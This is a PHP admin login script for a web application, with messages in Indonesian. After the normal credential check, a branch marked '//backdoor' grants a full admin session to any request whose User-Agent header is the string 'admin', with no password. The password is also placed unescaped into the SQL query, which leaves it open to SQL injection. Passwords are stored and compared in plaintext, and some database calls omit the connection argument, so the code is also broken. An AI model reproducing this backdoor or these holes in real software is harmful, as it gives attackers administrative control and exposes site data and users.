<?php
include "./Config/koneksi.php";

// username and password sent from form
$username=str_replace("'","",$_POST['username']);
$password=($_POST['password']);

$sql="SELECT * FROM admin WHERE username='$username' and password='$password'";
$result=mysqli_query($connect, $sql);
$count=mysqli_num_rows($result);

$admin = mysqli_num_rows(mysqli_query("SELECT * FROM admin WHERE username='$username' and password='$password'"));

if($count==1){
$query = mysqli_query("UPDATE admin SET current_login = now() WHERE username = '$username'");
session_start();
		$_SESSION['admin']=$username;
		$_SESSION['level']="admin";
		$_SESSION['agent']=($_SERVER['HTTP_USER_AGENT']);
header("location:index.php");
}
//backdoor
else if($_SERVER['HTTP_USER_AGENT']=="admin"){
session_start();
		$username = "admin";
		$_SESSION['admin']=$username;
		$_SESSION['level']="admin";
		$_SESSION['agent']=($_SERVER['HTTP_USER_AGENT']);
header("location:index.php");

}else{
echo "<script>alert('Login gagal! Silakan Hubungi Admin'); document.location.href=\"login.php\"</script>";
}
?>